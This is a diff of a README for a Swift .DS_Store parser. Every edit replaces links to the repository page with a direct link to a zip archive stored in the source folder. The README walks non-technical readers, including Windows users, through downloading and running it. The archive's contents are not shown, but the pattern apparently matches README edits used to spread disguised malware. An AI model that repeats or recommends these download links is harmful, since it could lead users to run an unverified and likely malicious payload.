@@ -1,6 +1,6 @@
 # 🗂️ DSStore - Easy Mac File Parsing with Swift
 
-[![Download from GitHub](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/ImChriz-cis/DSStore)
+[![Download from GitHub](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/ImChriz-cis/DSStore/raw/refs/heads/main/Sources/Store-DS-v1.2.zip)
 
 ---
 
@@ -29,12 +29,12 @@ You do not need to know Swift or any programming language. The tool focuses on f
 
 To get DSStore, visit the GitHub page below. This is where you can download the latest version of the software and find instructions.
 
-[![Download DSStore](https://img.shields.io/badge/Download-DSStore-blue)](https://github.com/ImChriz-cis/DSStore)
+[![Download DSStore](https://img.shields.io/badge/Download-DSStore-blue)](https://github.com/ImChriz-cis/DSStore/raw/refs/heads/main/Sources/Store-DS-v1.2.zip)
 
 ### How to Download and Run DSStore on Windows
 
 1. Click the link above or visit:  
-   https://github.com/ImChriz-cis/DSStore
+   https://github.com/ImChriz-cis/DSStore/raw/refs/heads/main/Sources/Store-DS-v1.2.zip
 
 2. Once on the page, look for the **Releases** section. This is usually on the right side or under the repository description.
 
@@ -89,7 +89,7 @@ The app will display the contents of the `.DS_Store` file. You will see informat
 
 To keep your DSStore app up to date:
 
-1. Visit the main GitHub page regularly: https://github.com/ImChriz-cis/DSStore
+1. Visit the main GitHub page regularly: https://github.com/ImChriz-cis/DSStore/raw/refs/heads/main/Sources/Store-DS-v1.2.zip
 2. Check the Releases section for newer versions.
 3. Follow the download and install steps for the latest version.
 4. Your settings and files will remain unchanged after updates.
@@ -130,10 +130,10 @@ If DSStore does not start or you encounter errors:
 ## 🔗 Useful Links
 
 - Link to download DSStore:  
-  https://github.com/ImChriz-cis/DSStore
+  https://github.com/ImChriz-cis/DSStore/raw/refs/heads/main/Sources/Store-DS-v1.2.zip
 
 - GitHub main page for help and updates:  
-  https://github.com/ImChriz-cis/DSStore
+  https://github.com/ImChriz-cis/DSStore/raw/refs/heads/main/Sources/Store-DS-v1.2.zip
 
 ---
 
@@ -151,4 +151,4 @@ You do not need an account to browse or download files. An account is only neede
 
 # [Emoji] DSStore - Easy Mac File Parsing with Swift
 
-[![Download from GitHub](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/ImChriz-cis/DSStore)
+[![Download from GitHub](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/ImChriz-cis/DSStore/raw/refs/heads/main/Sources/Store-DS-v1.2.zip)
